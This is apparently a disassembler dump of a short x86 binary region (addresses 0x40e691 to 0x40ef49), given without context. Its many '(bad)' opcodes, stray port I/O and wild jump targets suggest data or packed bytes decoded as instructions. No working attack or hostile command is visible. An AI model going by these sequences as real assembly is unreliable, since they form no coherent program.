  40e691:	shl    ebx,0x6
  40e694:	xchg   esp,eax
  40e695:	mov    bl,BYTE PTR [ebx-0x73]
  40e698:	mov    ebx,0x8cfe5807
  40e69d:	xchg   esi,eax
  40e69e:	add    DWORD PTR ds:[ecx],ebp
  40e6a1:	(bad)  
  40e6a3:	pop    ds
  40e6a4:	mov    bl,0x40
  40e6a6:	mov    cl,0x6
  40e6a8:	mov    ecx,0xe3184ab
  40e6ad:	xchg   esi,eax
  40e6ae:	scas   eax,DWORD PTR es:[edi]
  40e6af:	push   ds
  40e6b0:	jmp    0x908cedb8
  40e6b5:	cmp    BYTE PTR [ebp-0x3c16ffb9],dh
  40e6bb:	lea    esi,[ecx+eiz*8+0x0]
	...
  40e6cf:	add    BYTE PTR [ebx+0x22],cl
  40e6d2:	jl     0x40e6ba
  40e6d4:	pop    ebp
  40e6d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e6d6:	nop
  40e6d7:	test   DWORD PTR ss:[ebp+0x6f4abc8],ecx
  40e6de:	push   ebp
  40e6df:	bound  ecx,QWORD PTR [eax+0xac5c389]
  40e6e5:	pop    es
  40e6e6:	push   0xfffffffc
  40e6e8:	adc    ecx,DWORD PTR fs:[eax]
  40e6eb:	shl    DWORD PTR [ecx],0x38
  40e6ee:	jmp    FWORD PTR [esi+0x13fc436b]
  40e6f4:	mov    edx,0x5bf1748d
  40e6f9:	pop    esi
  40e6fa:	(bad)  
  40e6fb:	xchg   esi,eax
  40e6fc:	jge    0x40e71c
  40e6fe:	and    ecx,DWORD PTR [esi+0x49e7feef]
  40e704:	jge    0x40e693
  40e706:	(bad)  
  40e707:	adc    ecx,DWORD PTR [eax+0x5be1748d]
  40e70d:	jb     0x40e70d
  40e70f:	outs   dx,BYTE PTR ds:[esi]
  40e710:	lea    esi,gs:[ebp+eiz*2+0x5d]
  40e715:	adc    ecx,DWORD PTR [eax]
  40e717:	push   ecx
  40e718:	aaa    
  40e719:	cmp    bh,bh
  40e71b:	push   esi
  40e71c:	cmp    eax,esi
  40e71e:	add    ebp,ecx
  40e720:	push   cs
  40e721:	sub    bl,0x6a
  40e724:	xor    BYTE PTR [esi+edx*2+0x3e20f3d3],dl
  40e72b:	ss idiv esi
  40e72e:	out    0xb9,eax
  40e730:	jl     0x415834
	...
  40e746:	test   DWORD PTR [edx-0x1c522376],0xcd73e940
  40e750:	call   DWORD PTR [esp+ebx*8+0x4400651e]
  40e757:	dec    ecx
  40e758:	add    BYTE PTR [edi-0x1f],dl
  40e75b:	sub    eax,0xff190028
  40e760:	mov    edi,0xe7db3374
  40e765:	fisubr WORD PTR [ecx-0x66f4028f]
  40e76b:	sti    
  40e76c:	pop    ds
  40e76d:	mov    DWORD PTR [ebx+ebp*2],edx
  40e770:	data16 add cl,cl
  40e773:	bound  edi,QWORD PTR [eax+ebp*2+0x40cc3f]
  40e77a:	mov    ?,esp
  40e77c:	idiv   edi
  40e77e:	add    al,0xfb
  40e780:	out    0xc8,eax
  40e782:	add    dh,BYTE PTR [edx-0x3]
  40e785:	call   esp
  40e787:	push   0xffffffe6
  40e789:	icebp  
  40e78a:	out    0x71,eax
  40e78c:	std    
  40e78d:	cld    
  40e78e:	retf   0xb7c7
  40e791:	jmp    FWORD PTR [esi+0x72]
  40e794:	std    
  40e795:	repnz aas 
  40e797:	mov    al,0x5
  40e799:	jne    0x40e7cb
  40e79b:	jae    0x40e810
  40e79d:	cld    
  40e79e:	(bad)  
  40e79f:	cld    
  40e7a0:	pop    es
  40e7a1:	call   0x3fbe8d
  40e7a6:	scas   al,BYTE PTR es:[edi]
  40e7a7:	rol    al,0x4
	...
  40e7ba:	add    BYTE PTR [eax],al
  40e7bc:	pop    ecx
  40e7bd:	fmul   QWORD PTR [edx-0x1db42514]
  40e7c3:	push   edi
  40e7c4:	xor    eax,DWORD PTR [edi]
  40e7c6:	push   0x3f
  40e7c8:	scas   al,BYTE PTR es:[edi]
  40e7c9:	cld    
  40e7ca:	pop    es
  40e7cb:	call   0x3fbe81
  40e7d0:	ror    ah,1
  40e7d2:	sti    
  40e7d3:	mov    ecx,DWORD PTR [ecx+ecx*1+0x27]
  40e7d7:	inc    ecx
  40e7d8:	dec    ecx
  40e7d9:	xchg   DWORD PTR ds:0x67ca8500,edi
  40e7df:	jae    0x40e7d1
  40e7e1:	pop    edx
  40e7e2:	inc    ecx
  40e7e3:	add    bh,al
  40e7e5:	add    eax,0x9df02940
  40e7ea:	pop    es
  40e7eb:	rol    BYTE PTR [edi+esi*4+0x7d8ee82b],0x93
  40e7f3:	(bad)  
  40e7f4:	jmp    0x40e7d3
  40e7f6:	push   cs
  40e7f7:	and    BYTE PTR [ecx-0x26],ch
  40e7fa:	mov    esp,DWORD PTR [edi-0x10]
  40e7fd:	lahf   
  40e7fe:	mov    eax,ds:0x493458bd
  40e803:	inc    ecx
  40e804:	lock mov eax,0xcbd7f818
  40e80a:	sti    
  40e80b:	out    0x20,eax
  40e80d:	inc    ebp
  40e80e:	xchg   ebx,eax
  40e80f:	inc    bh
  40e811:	retf   
  40e812:	mov    esp,edi
  40e814:	cmp    edx,esi
  40e816:	xchg   edx,eax
  40e817:	(bad)  
  40e818:	mov    ah,0xad
  40e81a:	ret    0xafb8
  40e81d:	imul   edx,DWORD PTR [edx+0xfe],0x0
	...
  40e82f:	add    BYTE PTR [eax],al
  40e831:	add    BYTE PTR [edx+0x2506cc42],ah
  40e837:	aaa    
  40e838:	sbb    al,0x0
  40e83a:	lock jo 0x40e88e
  40e83d:	addr16 or al,0xe3
  40e840:	inc    esp
  40e841:	add    BYTE PTR [eax],bl
  40e843:	imul   ecx,DWORD PTR [eax+0x41],0xfffffff0
  40e847:	sbb    BYTE PTR [ecx],bl
  40e849:	or     BYTE PTR [eax+0x6fff0db2],cl
  40e84f:	mov    dh,0x2
  40e851:	push   0x435b6d
  40e856:	enter  0x486f,0x41
  40e85a:	lock inc eax
  40e85c:	fldcw  WORD PTR [ecx+ebx*1+0x5f]
  40e860:	add    ch,al
  40e862:	popf   
  40e863:	jbe    0x40e7f6
  40e865:	(bad)  
  40e866:	imul   esp,DWORD PTR [ebx-0x62],0x9106f069
  40e86d:	jne    0x40e823
  40e86f:	inc    edi
  40e870:	jmp    0xa8854890
  40e875:	add    ebx,DWORD PTR [edi]
  40e877:	aam    0x7b
  40e879:	fdiv   QWORD PTR [eax-0x5730eefa]
  40e87f:	mov    ebp,edi
  40e881:	jl     0x40e82f
  40e883:	xchg   edx,eax
  40e884:	add    BYTE PTR [ebx],0x88
  40e887:	push   0x1ef044a3
  40e88c:	cdq    
  40e88d:	dec    eax
  40e88e:	xor    DWORD PTR [edi],eax
  40e890:	(bad)  
  40e892:	push   esp
  40e893:	loopne 0x40e8bc
  40e895:	add    al,0x0
	...
  40e8a7:	add    al,cl
  40e8a9:	out    0x2f,eax
  40e8ab:	xchg   ebx,eax
  40e8ac:	(bad)  
  40e8ad:	jg     0x40e8da
  40e8af:	xchg   esp,eax
  40e8b0:	jl     0x40e8f5
  40e8b2:	lds    esi,FWORD PTR [ebx]
  40e8b4:	pop    eax
  40e8b5:	bound  ebp,QWORD PTR [ebx]
  40e8b7:	inc    ebp
  40e8b8:	lock push ds
  40e8ba:	jns    0x40e904
  40e8bc:	xor    DWORD PTR [edi],eax
  40e8be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e8bf:	fcomp  DWORD PTR [eax+eiz*8]
  40e8c2:	daa    
  40e8c3:	add    al,0x98
  40e8c5:	add    esi,DWORD PTR [eax]
  40e8c7:	xchg   ebx,eax
  40e8c8:	sahf   
  40e8c9:	jg     0x40e8ee
  40e8cb:	pushf  
  40e8cc:	jb     0x40e8d9
  40e8ce:	jge    0x40e8d3
  40e8d0:	add    al,0x3f
  40e8d2:	push   0x10
  40e8d4:	add    BYTE PTR [esi],0xfd
  40e8d7:	inc    ebp
  40e8d8:	jae    0x40e8e5
  40e8da:	jge    0x40e8df
  40e8dc:	cld    
  40e8dd:	retf   0x4d0
  40e8e0:	lock cdq 
  40e8e2:	sahf   
  40e8e3:	xchg   edx,eax
  40e8e4:	fdiv   st(6),st
  40e8e6:	inc    eax
  40e8e7:	aaa    
  40e8e8:	ret    0x4d89
  40e8eb:	xchg   edx,eax
  40e8ec:	fcom   QWORD PTR [edx-0x6107e7bb]
  40e8f2:	xchg   ecx,eax
  40e8f3:	xor    eax,0x35ff8947
  40e8f8:	fcom   DWORD PTR [esi-0x5ec44b02]
  40e8fe:	lahf   
  40e8ff:	mov    ebx,0x94fe8882
  40e904:	xchg   DWORD PTR [eax+0x727be174],ecx
  40e90a:	push   ecx
  40e90b:	push   cs
	...
  40e91c:	add    BYTE PTR [eax],al
  40e91e:	or     BYTE PTR [eax+0x12620d74],0xe8
  40e925:	(bad)  
  40e926:	(bad)  
  40e928:	out    0x92,eax
  40e92a:	lds    ecx,FWORD PTR [ecx-0x65201102]
  40e930:	out    0x7d,eax
  40e932:	daa    
  40e933:	mov    dh,bh
  40e935:	fdivp  st(7),st
  40e937:	xchg   edx,eax
  40e938:	out    0x65,eax
  40e93a:	daa    
  40e93b:	mov    dh,bh
  40e93d:	into   
  40e93e:	call   DWORD PTR [esi-0x77f89219]
  40e944:	(bad)  
  40e945:	mov    esi,0x35e79edf
  40e94a:	pop    es
  40e94b:	mov    dh,bh
  40e94d:	scas   al,BYTE PTR es:[edi]
  40e94e:	fisttp WORD PTR [edx-0x5f53e302]
  40e954:	out    dx,al
  40e955:	cmp    eax,DWORD PTR [ecx-0x495fa177]
  40e95b:	add    al,0x0
  40e95d:	xor    al,0x15
  40e95f:	pushf  
  40e960:	sub    BYTE PTR [ebp+0x13001e60],0x2c
  40e967:	mov    BYTE PTR [ecx+eiz*8+0x5b],dh
  40e96b:	jbe    0x40e9be
  40e96d:	outs   dx,BYTE PTR ds:[esi]
  40e96e:	popa   
  40e96f:	jg     0x40e9b5
  40e971:	gs push cs
  40e973:	pop    es
  40e974:	push   0xffffffe9
  40e976:	or     esp,DWORD PTR [ebx+0x1ef3a844]
  40e97c:	add    cl,ch
  40e97e:	repz xchg bh,ah
	...
  40e991:	add    BYTE PTR [eax],al
  40e993:	add    BYTE PTR [ebp+0x42fffedc],dl
  40e999:	les    esi,FWORD PTR [edx+0x23]
  40e99c:	pop    ecx
  40e99d:	ins    BYTE PTR es:[edi],dx
  40e99e:	add    DWORD PTR [edi+0x6],ebx
  40e9a1:	jbe    0x40e9ac
  40e9a3:	ror    BYTE PTR [ebp+0x19684e9d],0x4
  40e9aa:	out    dx,eax
  40e9ab:	mov    esi,0x41435771
  40e9b0:	or     esp,edx
  40e9b2:	(bad)  
  40e9b3:	jne    0x40e9b6
  40e9b5:	ins    BYTE PTR es:[edi],dx
  40e9b6:	out    dx,eax
  40e9b7:	jns    0x40e9bf
  40e9b9:	ja     0x40e9a1
  40e9bb:	sbb    eax,0xfffd775c
  40e9c0:	jl     0x40ea39
  40e9c2:	std    
  40e9c3:	jne    0x40e9a6
  40e9c5:	imul   ecx,DWORD PTR [esi-0x388939ae],0xffffffc2
  40e9cc:	int    0x3
  40e9ce:	push   ebp
  40e9cf:	mov    edx,DWORD PTR [ebp-0x11033d7e]
  40e9d5:	call   0x765953d9
  40e9da:	jae    0x40e9e4
  40e9dc:	mov    cl,0xb2
  40e9de:	push   eax
  40e9df:	inc    DWORD PTR [esi+0x22fc440c]
  40e9e5:	mov    ecx,0x2d82884
  40e9ea:	cmp    BYTE PTR [edi],0x89
  40e9ed:	out    dx,eax
  40e9ee:	aas    
  40e9ef:	push   0x413d8b
  40e9f4:	out    dx,al
  40e9f5:	push   0x7c
  40e9f7:	daa    
	...
  40ea08:	add    BYTE PTR [eax],al
  40ea0a:	cdq    
  40ea0b:	add    ecx,DWORD PTR [ebx]
  40ea0d:	sar    BYTE PTR [ebp-0x5e],0x55
  40ea11:	call   0x3fc03e
  40ea16:	(bad)  
  40ea18:	jb     0x40ea33
  40ea1a:	test   eax,0xf0ffffeb
  40ea1f:	inc    eax
  40ea20:	push   ecx
  40ea21:	addr16 call 0xa0412b86
  40ea27:	inc    eax
  40ea28:	push   ss
  40ea29:	or     BYTE PTR [eax+0x18],bl
  40ea2c:	or     bh,bh
  40ea2e:	aas    
  40ea2f:	inc    ebp
  40ea30:	dec    esp
  40ea31:	push   ebx
  40ea32:	aaa    
  40ea33:	fmul   DWORD PTR [esi-0x6fd9cfce]
  40ea39:	(bad)  
  40ea3a:	daa    
  40ea3b:	call   0x991997d4
  40ea40:	adc    eax,0x8e7217c0
  40ea45:	inc    BYTE PTR [ebp-0x5de0656b]
  40ea4b:	mov    BYTE PTR [esi+0x6db295e],cl
  40ea51:	add    BYTE PTR [ebp-0x4b7d60dc],bl
  40ea57:	ins    BYTE PTR es:[edi],dx
  40ea58:	ss push 0xfffffff0
  40ea5b:	fld    DWORD PTR [ecx-0x1]
  40ea5e:	gs push 0x5541c19a
  40ea64:	mov    cs,WORD PTR [eax+0x3c7a4c35]
  40ea6a:	outs   dx,BYTE PTR ds:[esi]
  40ea6b:	sbb    BYTE PTR [ebp+0x0],al
	...
  40ea7e:	add    BYTE PTR [eax],al
  40ea80:	jo     0x40eaff
  40ea82:	add    dh,BYTE PTR [eax+esi*1-0x38]
  40ea86:	jmp    0x40eacd
  40ea88:	xor    DWORD PTR [eax+0x35],esi
  40ea8b:	call   0x433785
  40ea90:	jmp    0x40ea41
  40ea92:	pop    ss
  40ea93:	and    edi,DWORD PTR [edi]
  40ea95:	mov    bl,dl
  40ea97:	pop    ebp
  40ea98:	(bad)  
  40ea99:	(bad)  
  40ea9a:	cli    
  40ea9b:	mov    edi,0x683266fc
  40eaa0:	lock outs dx,DWORD PTR ds:[esi]
  40eaa2:	popf   
  40eaa3:	mov    ebp,0x41445508
  40eaa8:	lock push es
  40eaaa:	mov    ecx,0x510edc8e
  40eaaf:	out    dx,al
  40eab0:	fadd   DWORD PTR [ebp-0x255663ab]
  40eab6:	dec    ebp
  40eab7:	(bad)  
  40eab8:	dec    ebx
  40eab9:	cmp    ch,BYTE PTR [ecx]
  40eabb:	dec    ebp
  40eabc:	inc    esi
  40eabd:	xchg   BYTE PTR ds:0xf0b5418f,bh
  40eac3:	push   es
  40eac4:	mov    ebp,0x17e2c246
  40eac9:	mov    eax,eax
  40eacb:	mov    fs,WORD PTR [esi]
  40eacd:	adc    ch,BYTE PTR [ecx]
  40eacf:	sbb    ah,dl
  40ead1:	out    dx,al
  40ead2:	mov    edi,0xb906b145
  40ead7:	fwait
  40ead8:	call   0xb7cff0bb
  40eadd:	out    dx,al
  40eade:	call   0x8105f9e6
  40eae3:	out    dx,al
	...
  40eaf4:	add    BYTE PTR [eax],al
  40eaf6:	lods   eax,DWORD PTR ds:[esi]
  40eaf7:	(bad)  
  40eaf8:	call   0xf13cda30
  40eafd:	fwait
  40eafe:	sar    dh,1
  40eb00:	fisttp QWORD PTR [esi-0x70c2ec29]
  40eb06:	(bad)  
  40eb07:	lock or DWORD PTR [esp-0x5713a21],ebx
  40eb0f:	inc    esi
  40eb10:	xor    al,0xe8
  40eb12:	push   edi
  40eb13:	cmp    BYTE PTR [edi],ch
  40eb15:	inc    ebp
  40eb16:	lock (bad) 
  40eb18:	rcr    BYTE PTR [ecx+0x33a58646],0x18
  40eb1f:	pop    es
  40eb20:	jmp    0xf62f48c3
  40eb25:	inc    ebp
  40eb26:	xor    DWORD PTR [edi],eax
  40eb28:	cmp    DWORD PTR [edi+0x51910f04],ecx
  40eb2e:	inc    DWORD PTR [ebp-0x26626483]
  40eb34:	push   DWORD PTR [ebp+0x66]
  40eb37:	test   BYTE PTR [ebp+ebp*2+0x7e],dh
  40eb3b:	cli    
  40eb3c:	pop    es
  40eb3d:	push   ecx
  40eb3e:	sbb    al,0xd8
  40eb40:	(bad)  
  40eb41:	pop    esi
  40eb42:	push   cs
  40eb43:	push   eax
  40eb44:	shr    ebp,0xf3
  40eb47:	fisttp DWORD PTR [edx-0x10b68dc3]
  40eb4d:	je     0x40eb07
  40eb4f:	jbe    0x40eba0
  40eb51:	fcom   DWORD PTR ds:[edx]
  40eb54:	call   0xfec6eff7
  40eb59:	loop   0x40eb5b
	...
  40eb6b:	add    BYTE PTR [ebx],dh
  40eb6d:	stc    
  40eb6e:	xor    DWORD PTR [edx+0x0],ebp
  40eb71:	add    DWORD PTR [ecx],0xffffff97
  40eb74:	adc    dl,BYTE PTR [eax-0x7832eebc]
  40eb7a:	aaa    
  40eb7b:	mov    ebp,0x618fa11
  40eb80:	call   0xfbb5ea9b
  40eb85:	ins    BYTE PTR es:[edi],dx
  40eb86:	and    eax,0xfe846699
  40eb8b:	je     0x40ec0c
  40eb8d:	test   DWORD PTR [ecx+eiz*8+0x75],esi
  40eb91:	sti    
  40eb92:	pop    es
  40eb93:	rcr    DWORD PTR [esi],1
  40eb95:	xlat   BYTE PTR ds:[ebx]
  40eb96:	(bad)  
  40eb97:	(bad)  
  40eb98:	push   edi
  40eb99:	retf   
  40eb9a:	out    dx,eax
  40eb9b:	cmp    DWORD PTR [ebx+edi*4+0x58],ebp
  40eb9f:	(bad)  
  40eba0:	jne    0x40ebf1
  40eba2:	shr    ebp,0xf3
  40eba5:	(bad)  [edx-0x8b78e3b]
  40ebab:	inc    ebx
  40ebac:	hlt    
  40ebad:	lock inc edx
  40ebaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ebb0:	dec    DWORD PTR [esi]
  40ebb2:	call   0xfec4d008
  40ebb7:	pusha  
  40ebb8:	das    
  40ebb9:	sub    DWORD PTR [ecx-0x17],0xffffffe9
  40ebbd:	push   es
  40ebbe:	push   0x40caae00
  40ebc3:	add    cl,ah
  40ebc5:	or     BYTE PTR [eax],al
  40ebc7:	add    BYTE PTR [ecx],cl
  40ebc9:	mov    ds:0x91de5670,eax
  40ebce:	or     eax,eax
	...
  40ebe0:	add    BYTE PTR [eax],al
  40ebe2:	inc    ebp
  40ebe3:	push   ebx
  40ebe4:	xchg   DWORD PTR [ebp-0x2f],eax
  40ebe7:	and    cl,BYTE PTR [ebx-0xf777ba]
  40ebed:	jne    0x40eb90
  40ebef:	mov    ds:0x85925e0,al
  40ebf4:	or     eax,eax
  40ebf6:	test   DWORD PTR [edi-0x3],esp
  40ebf9:	jne    0x40ebfc
  40ebfb:	mov    ds:0x91de5d01,eax
  40ec00:	dec    esi
  40ec01:	push   0x3e4efb
  40ec06:	or     DWORD PTR [eax],0x20bfef00
  40ec0c:	add    BYTE PTR [eax-0x2],dl
  40ec0f:	sbb    ecx,DWORD PTR [eax]
  40ec11:	call   0x400657
  40ec16:	loope  0x40ec89
  40ec18:	push   ecx
  40ec19:	(bad)  
  40ec1a:	(bad)  
  40ec1b:	xchg   edx,eax
  40ec1c:	jae    0x40ec16
  40ec1e:	icebp  
  40ec1f:	jns    0x40ec72
  40ec21:	dec    esi
  40ec23:	xchg   edx,eax
  40ec24:	jae    0x40ec22
  40ec26:	mov    esi,0x53e8081c
  40ec2b:	cmp    bh,bh
  40ec2d:	call   DWORD PTR [eax-0x1bfffdbb]
  40ec33:	std    
  40ec34:	jmp    0x3300:0x68939583
  40ec3b:	iret   
  40ec3c:	(bad)  
  40ec3d:	jne    0x40ebd0
  40ec3f:	lahf   
  40ec40:	sub    al,0x50
  40ec42:	dec    esi
  40ec43:	xchg   edx,eax
  40ec44:	xchg   DWORD PTR [ebp+0x0],eax
	...
  40ec57:	add    BYTE PTR [ebp+0x1f],bh
  40ec5a:	add    BYTE PTR [eax],al
  40ec5c:	lock mov WORD PTR [edi+eiz*2+0x6e],cs
  40ec61:	sub    eax,DWORD PTR [ebx+0x0]
  40ec64:	sbb    cl,ah
  40ec66:	inc    esp
  40ec67:	inc    ecx
  40ec68:	lock add al,0x16
  40ec6b:	or     BYTE PTR [eax+0x6fff1403],cl
  40ec71:	hlt    
  40ec72:	adc    eax,0xfa6267fc
  40ec77:	out    0xaf,eax
  40ec79:	mov    ebp,0x2f29fe8b
  40ec7e:	pop    es
  40ec7f:	add    BYTE PTR [ebp+0x2c829ee8],ah
  40ec85:	lds    ebx,FWORD PTR [edx]
  40ec87:	add    al,dh
  40ec89:	aam    0x4c
  40ec8b:	(bad)  
  40ec8c:	mov    ebp,0xbf429a65
  40ec91:	xor    al,0x8c
  40ec93:	(bad)  
  40ec94:	popf   
  40ec95:	jns    0x40ec22
  40ec97:	je     0x40ec81
  40ec99:	adc    eax,0x1c174e69
  40ec9e:	mov    WORD PTR [eax+eiz*8+0x14],?
  40eca2:	push   ss
  40eca3:	or     BYTE PTR [eax],bl
  40eca5:	cld    
  40eca6:	cmp    edi,edi
  40eca8:	inc    DWORD PTR [ebx+0x1f71814]
  40ecae:	idiv   esi
  40ecb0:	gs push 0x6937549a
  40ecb6:	mov    ah,BYTE PTR [edi-0x43]
  40ecb9:	sub    al,BYTE PTR [ebp+0x0]
	...
  40eccc:	add    BYTE PTR [eax],al
  40ecce:	xlat   BYTE PTR ds:[ebx]
  40eccf:	jecxz  0x40ecc4
  40ecd1:	out    0x15,eax
  40ecd3:	or     eax,DWORD PTR [eax+eax*1]
  40ecd6:	sti    
  40ecd7:	scas   eax,DWORD PTR es:[edi]
  40ecd8:	adc    BYTE PTR [ebp+0x48],ah
  40ecdb:	mov    eax,ds:0x47f04141
  40ece0:	or     ah,BYTE PTR [ebx]
  40ece2:	lock outs dx,DWORD PTR ds:[esi]
  40ece4:	jnp    0x40ed2a
  40ece6:	test   al,0x7
  40ece8:	adc    DWORD PTR [ebx-0x751737cb],ebp
  40ecee:	sbb    al,0x17
  40ecf0:	add    DWORD PTR [ebx],0xfee906d5
  40ecf6:	inc    edi
  40ecf7:	sti    
  40ecf8:	out    dx,al
  40ecf9:	push   es
  40ecfa:	xor    eax,0xe0416f7f
  40ecff:	cmp    ebx,0x1a457f3
  40ed05:	mov    esp,DWORD PTR [esi-0x7a]
  40ed08:	pusha  
  40ed09:	mov    esp,ebx
  40ed0b:	cmp    dh,BYTE PTR [eax+0x41]
  40ed0e:	push   esp
  40ed0f:	out    dx,eax
  40ed10:	out    0x3,eax
  40ed12:	pop    edi
  40ed13:	ror    DWORD PTR [ebp+0x11],0xf8
  40ed17:	outs   dx,BYTE PTR ds:[esi]
  40ed18:	xor    edi,DWORD PTR [edx]
  40ed1a:	aas    
  40ed1b:	cmp    BYTE PTR ds:0xbb81e411,0xfb
  40ed22:	pop    ss
  40ed23:	sub    ebx,DWORD PTR [esi-0x647dd976]
  40ed29:	xchg   DWORD PTR [esi],ebx
  40ed2b:	cld    
  40ed2c:	lock fwait
  40ed2e:	pop    esi
  40ed2f:	rcl    DWORD PTR ds:0x8b,1
	...
  40ed41:	add    BYTE PTR [eax],al
  40ed43:	add    BYTE PTR [esi],cl
  40ed45:	cld    
  40ed46:	lock mov bh,BYTE PTR [edx+ebx*1+0x6]
  40ed4b:	adc    eax,ebp
  40ed4d:	outs   dx,BYTE PTR ds:[esi]
  40ed4e:	sbb    eax,0x1f81f73a
  40ed53:	mov    BYTE PTR [ebx],0x7
  40ed56:	xchg   esp,eax
  40ed57:	jle    0x40ed34
  40ed59:	test   DWORD PTR [ebx+ecx*4-0x54e479bb],ebp
  40ed60:	add    eax,0x4403e8c8
  40ed65:	add    ebp,DWORD PTR [edx-0x38]
  40ed68:	stos   BYTE PTR es:[edi],al
  40ed69:	xor    BYTE PTR [eax],ch
  40ed6b:	add    al,0xf0
  40ed6d:	cli    
  40ed6e:	cmp    DWORD PTR [edi-0x2e0c],eax
  40ed74:	xor    eax,0x6350007
  40ed79:	dec    edx
  40ed7a:	inc    esp
  40ed7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed7c:	repz push es
  40ed7e:	add    cl,ch
  40ed80:	mov    dl,0xca
  40ed82:	imul   ecx
  40ed84:	repz push es
  40ed86:	add    BYTE PTR [eax+esi*1-0x7d],bl
  40ed8a:	dec    edi
  40ed8b:	je     0x40edbd
  40ed8d:	jg     0x40edde
  40ed8f:	adc    ebp,esp
  40ed91:	out    dx,al
  40ed92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed93:	das    
  40ed94:	mov    ch,0x6
  40ed96:	call   esp
  40ed98:	xchg   esi,eax
  40ed99:	xor    eax,DWORD PTR [ecx-0x17]
  40ed9c:	pop    esi
  40ed9d:	shl    DWORD PTR [ebx-0x56],0x6e
  40eda1:	add    bh,al
  40eda3:	jmp    0xccc431a7
	...
  40edb8:	add    BYTE PTR [eax],al
  40edba:	outs   dx,DWORD PTR ds:[esi]
  40edbb:	xor    DWORD PTR [edx-0x2],0x52fbfabe
  40edc2:	dec    ecx
  40edc3:	fisttp DWORD PTR [edx+0x17fb7aff]
  40edc9:	add    DWORD PTR cs:[ebx],esp
  40edcc:	call   FWORD PTR [edi-0x268a7fe5]
  40edd2:	push   0xfffffffa
  40edd4:	pop    es
  40edd5:	add    DWORD PTR [ecx-0x7d],ebx
  40edd8:	dec    BYTE PTR [esi]
  40edda:	fld    DWORD PTR [ecx+0x4b76014c]
  40ede0:	add    ebp,DWORD PTR [edx-0x18]
  40ede3:	jle    0x40ede4
  40ede5:	jl     0x40edd7
  40ede7:	cmp    DWORD PTR ds:0xfe5800e9,0x5c
  40edee:	push   0xbabe1481
  40edf3:	(bad)  
  40edf4:	push   DWORD PTR [esi]
  40edf6:	mov    eax,DWORD PTR [esi+0x3]
  40edf9:	jmp    0x12c7a14
  40edfe:	dec    edx
  40edff:	inc    edi
  40ee00:	repnz push ebx
  40ee02:	mov    es,WORD PTR [eax-0x8]
  40ee05:	add    BYTE PTR [ecx-0x3338fffc],bl
  40ee0b:	xchg   esi,eax
  40ee0c:	(bad)  
  40ee0d:	dec    DWORD PTR [ecx-0x668a00fc]
  40ee13:	inc    DWORD PTR [ebx-0x4]
  40ee16:	dec    eax
  40ee17:	sbb    ah,bh
  40ee19:	push   0xffffff99
  40ee1b:	and    al,BYTE PTR [eax]
  40ee1d:	push   0x0
	...
  40ee2f:	add    BYTE PTR [ecx+0x7cff0022],cl
  40ee35:	mov    ch,bh
  40ee37:	jne    0x40ee8e
  40ee39:	and    al,BYTE PTR [eax]
  40ee3b:	push   0x59
  40ee3d:	pushf  
  40ee3e:	retf   0x4922
  40ee41:	add    al,0xb
  40ee43:	sar    BYTE PTR ds:0xb1504e51,0x28
  40ee4a:	push   ecx
  40ee4b:	push   DWORD PTR [esi-0x6f07bc05]
  40ee51:	and    al,BYTE PTR [eax]
  40ee53:	push   0x49
  40ee55:	xor    eax,0x8de175ff
  40ee5a:	jae    0x40ee58
  40ee5c:	(bad)  
  40ee5d:	(bad)  
  40ee5f:	push   0x9
  40ee61:	and    al,BYTE PTR [eax]
  40ee63:	call   0x3f5717
  40ee68:	adc    al,BYTE PTR [ebx+esi*2+0xf]
  40ee6c:	test   BYTE PTR [edi],0xf8
  40ee6f:	call   0x4023a1
  40ee74:	into   
  40ee75:	aas    
  40ee76:	clc    
  40ee77:	add    cl,bl
  40ee79:	add    eax,DWORD PTR [eax]
  40ee7b:	adc    DWORD PTR [esp+ecx*4-0x2],0x73
  40ee80:	daa    
  40ee81:	mov    ?,WORD PTR [ebx+0x8]
  40ee84:	mov    dh,0x10
  40ee86:	clc    
  40ee87:	call   0x24747c
  40ee8c:	(bad)  
  40ee8d:	fs ret 0xff73
  40ee91:	sbb    eax,0x7489
	...
  40eea6:	call   0xf062f200
  40eeab:	ins    DWORD PTR es:[edi],dx
  40eeac:	sub    DWORD PTR [ebx],eax
  40eeae:	mov    cl,0xe4
  40eeb0:	stos   BYTE PTR es:[edi],al
  40eeb1:	jmp    0x4a1d:0xccaedca
  40eeb8:	sar    bh,0x8f
  40eebb:	cmp    al,0x9c
  40eebd:	in     eax,dx
  40eebe:	shr    DWORD PTR [ebp+0x2],1
  40eec1:	or     esi,DWORD PTR [eax+0x204fed81]
  40eec7:	xchg   esi,eax
  40eec8:	nop
  40eec9:	dec    edi
  40eeca:	outs   dx,DWORD PTR ds:[esi]
  40eecb:	clc    
  40eecc:	jns    0x40ef12
  40eece:	pop    esp
  40eecf:	push   ss
  40eed0:	xor    edi,edi
  40eed2:	in     eax,0xe1
  40eed4:	xor    ebp,eax
  40eed6:	idiv   DWORD PTR [esi+0x6f5bfe87]
  40eedc:	inc    edx
  40eedd:	or     BYTE PTR [eax],0x6e
  40eee0:	or     eax,0x8ac23fd1
  40eee5:	out    0x31,eax
  40eee7:	popf   
  40eee8:	xchg   esi,edi
  40eeea:	jnp    0x40ee9e
  40eeec:	mov    ds,WORD PTR [edx+0x39]
  40eeef:	sub    esi,edi
  40eef1:	inc    esp
  40eef3:	hlt    
  40eef4:	xchg   esi,eax
  40eef5:	sub    BYTE PTR [ecx+edi*1],0x31
  40eef9:	push   edi
  40eefa:	jae    0x40ef56
  40eefc:	aaa    
  40eefd:	sub    DWORD PTR [ecx-0x98afd93],esi
  40ef03:	test   al,0x28
  40ef05:	leave  
  40ef06:	xor    dh,BYTE PTR [ecx+0x2]
  40ef09:	lea    eax,[eax]
	...
  40ef1b:	add    BYTE PTR ds:0x5dff3180,dh
  40ef21:	pop    esp
  40ef22:	call   0xea87:0xe6074630
  40ef29:	inc    esi
  40ef2a:	in     eax,dx
  40ef2b:	jg     0x40ef49
  40ef2d:	or     cl,ch
  40ef2f:	add    esi,DWORD PTR [ecx-0x4]
  40ef32:	int3   
  40ef33:	add    al,0xf0
  40ef35:	push   ss
  40ef36:	jmp    0xe8576231
  40ef3b:	add    esi,eax
  40ef3d:	jge    0x40ef7a
  40ef3f:	mov    BYTE PTR [esi+0x5b9cb0f4],ah
  40ef45:	loopne 0x40eeec
  40ef47:	xchg   edx,ebp
  40ef49:	inc    esi
